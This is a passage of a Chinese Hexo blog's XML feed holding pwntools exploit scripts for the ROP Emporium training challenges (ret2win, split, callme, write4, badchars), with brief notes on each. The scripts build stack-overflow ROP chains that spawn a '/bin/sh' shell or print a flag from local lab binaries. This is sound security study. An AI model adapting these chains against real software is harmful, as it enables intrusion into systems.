class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.terminnal = ['gnome-terminal','-e']</span></span><br><span class="line">p = process(<span class="string">'./callme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</span></span><br><span class="line">pppad = <span class="number">0x00401ab0</span></span><br><span class="line">callme_three = elf.plt[<span class="string">'callme_three'</span>]</span><br><span class="line">callme_two = elf.plt[<span class="string">'callme_two'</span>]</span><br><span class="line">callme_one = elf.plt[<span class="string">'callme_one'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">40</span></span><br><span class="line">payload += p64(pppad+<span class="number">3</span>)</span><br><span class="line">payload += p64(pppad) +p64(<span class="number">1</span>) +p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(callme_one)</span><br><span class="line">payload += p64(pppad) +p64(<span class="number">1</span>) +p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(callme_two)</span><br><span class="line">payload += p64(pppad) +p64(<span class="number">1</span>) +p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(callme_three)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn入门&quot;&gt;&lt;a href=&quot;#pwn入门&quot; class=&quot;headerlink&quot; title=&quot;pwn入门&quot;&gt;&lt;/a&gt;pwn入门&lt;/h1&gt;&lt;h2 id=&quot;什么是pwn&quot;&gt;&lt;a href=&quot;#什么是pwn&quot; class=&quot;headerlink&quot; title=&quot;什</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/03/13/hello-world/"/>
    <id>http://example.com/2021/03/13/hello-world/</id>
    <published>2021-03-13T05:53:10.160Z</published>
    <updated>2020-08-15T05:27:33.867Z</updated>
    
    <content type="html"><![CDATA[<p>第n次搭建博客终于成功，过去失败的经验告诉我们不要整些花里胡哨的东西，搞个简单点的主题就行，要不然hexo的各种插件会搞死你，网速好的话可能一会就弄完了，像我这种穷b没钱搭梯子，只能慢慢更新。好了希望看到我文章的各位师傅们轻点喷，也希望师傅们万事如意。（狗头保命）。</p><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><h3 id="new-world"><a href="#new-world" class="headerlink" title="new world"></a>new world</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">print</span>(<span class="string">&#x27;Hello World!&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第n次搭建博客终于成功，过去失败的经验告诉我们不要整些花里胡哨的东西，搞个简单点的主题就行，要不然hexo的各种插件会搞死你，网速好的话可能一会就弄完了，像我这种穷b没钱搭梯子，只能慢慢更新。好了希望看到我文章的各位师傅们轻点喷，也希望师傅们万事如意。（狗头保命）。&lt;/p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ROPempire</title>
    <link href="http://example.com/2020/10/02/ROPempire/"/>
    <id>http://example.com/2020/10/02/ROPempire/</id>
    <published>2020-10-01T17:25:52.000Z</published>
    <updated>2021-03-13T07:58:44.991Z</updated>
    
    <content type="html"><![CDATA[<p>##ret2win</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ret2win'</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 0x0400824</span><br><span class="line"></span><br><span class="line">pad = <span class="string">'a'</span>*0x20+<span class="string">'deadbeef'</span></span><br><span class="line"></span><br><span class="line">payload = pad+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>##split<br>考察将字符串通过寄存器存到函数当中，要熟练掌握x86与x64的传参规律.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./split'</span>)</span><br><span class="line"><span class="comment">#elf = ELF('./split')</span></span><br><span class="line"></span><br><span class="line">system_addr = 0x00400810</span><br><span class="line"><span class="comment">#system_addr = elf.symbols['system']</span></span><br><span class="line">cat_flag_addr = 0x00601060</span><br><span class="line">pop_rdi_ret = 0x00400883</span><br><span class="line">pad = <span class="string">'A'</span>*40</span><br><span class="line"></span><br><span class="line">payload = pad+p64(pop_rdi_ret)+p64(cat_flag_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>##callme<br>对参数传递的考察</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./callme'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./callme'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">pppr = 0x0000000000401ab0 <span class="comment"># pop rdi ; pop rsi ; pop rdx ; ret</span></span><br><span class="line">callme_three = 0x401810</span><br><span class="line">callme_two = 0x401870</span><br><span class="line">callme_one = 0x401850</span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = 40</span><br><span class="line">payload = <span class="string">'\0'</span>*offset</span><br><span class="line">payload += p64(pppr+3)</span><br><span class="line">payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_one)</span><br><span class="line">payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_two)</span><br><span class="line">payload += p64(pppr) + p64(1) + p64(2) + p64(3) + p64(callme_three) </span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>##write4<br>考察通过将字符串写入.bss段来将字符串传递给system函数然后getshell，同时考察gadget的选取与对段的理解。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./write4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr = 0x00400810</span><br><span class="line">bss_addr = 0x601060</span><br><span class="line">mov_r14_r15 = 0x400820</span><br><span class="line">pop_r14_r15 = 0x400890</span><br><span class="line">pop_rdi = 0x400893</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(0x20+8)</span><br><span class="line">payload += p64(pop_r14_r15)   <span class="comment">#清空寄存器</span></span><br><span class="line">payload += p64(bss_addr)        <span class="comment">#向r14中写入bss段地址</span></span><br><span class="line">payload += <span class="string">"/bin/sh"</span>.ljust(8,<span class="string">"\x00"</span>)    <span class="comment">#向r15中写入/bin/sh\x00</span></span><br><span class="line">payload += p64(mov_r14_r15)         <span class="comment">#将r15中的字符串写入r14</span></span><br><span class="line">payload += p64(pop_rdi)             <span class="comment">#清空rdi</span></span><br><span class="line">payload += p64(bss_addr)            <span class="comment">#向rdi中写入bss中的字符串</span></span><br><span class="line">payload += p64(sys_addr)            <span class="comment">#rdi向system传参</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>##badchars</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./badchars'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./badchars'</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">prdi = 0x400b39 </span><br><span class="line">p1213 = 0x400b3b</span><br><span class="line">m1213 = 0x400b34</span><br><span class="line">system = 0x04009E8</span><br><span class="line"><span class="comment">#system = elf.plt['system']</span></span><br><span class="line">p1415 = 0x400b40</span><br><span class="line">x1415 = 0x400b30</span><br><span class="line"></span><br><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">   0x400b30 &lt;usefulGadgets&gt;:    xor    BYTE PTR [r15],r14b</span></span><br><span class="line"><span class="string">   0x400b33 &lt;usefulGadgets+3&gt;:  ret    </span></span><br><span class="line"><span class="string">   0x400b34 &lt;usefulGadgets+4&gt;:  mov    QWORD PTR [r13+0x0],r12</span></span><br><span class="line"><span class="string">   0x400b38 &lt;usefulGadgets+8&gt;:  ret    </span></span><br><span class="line"><span class="string">   0x400b39 &lt;usefulGadgets+9&gt;:  pop    rdi</span></span><br><span class="line"><span class="string">=&gt; 0x400b3a &lt;usefulGadgets+10&gt;: ret    </span></span><br><span class="line"><span class="string">   0x400b3b &lt;usefulGadgets+11&gt;: pop    r12</span></span><br><span class="line"><span class="string">   0x400b3d &lt;usefulGadgets+13&gt;: pop    r13</span></span><br><span class="line"><span class="string">   0x400b3f &lt;usefulGadgets+15&gt;: ret    </span></span><br><span class="line"><span class="string">   0x400b40 &lt;usefulGadgets+16&gt;: pop    r14</span></span><br><span class="line"><span class="string">   0x400b42 &lt;usefulGadgets+18&gt;: pop    r15</span></span><br><span class="line"><span class="string">   0x400b44 &lt;usefulGadgets+20&gt;: ret   </span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = 40</span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line"><span class="comment"># filtered: bic/ fns</span></span><br><span class="line"><span class="comment"># $0 is okay, but use gadget x1415 to get /bin/sh via xor is the goal (too lazy to write exp) </span></span><br><span class="line">payload += p64(p1213) + <span class="string">'$0\0\0\0\0\0\0'</span> + p64(elf.bss()+0x400) + p64(m1213) </span><br><span class="line">payload += p64(prdi) + p64(elf.bss()+0x400) + p64(system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;##ret2win&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;</summary>
      
    
    
    
    <category term="从0开始" scheme="http://example.com/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
</feed>
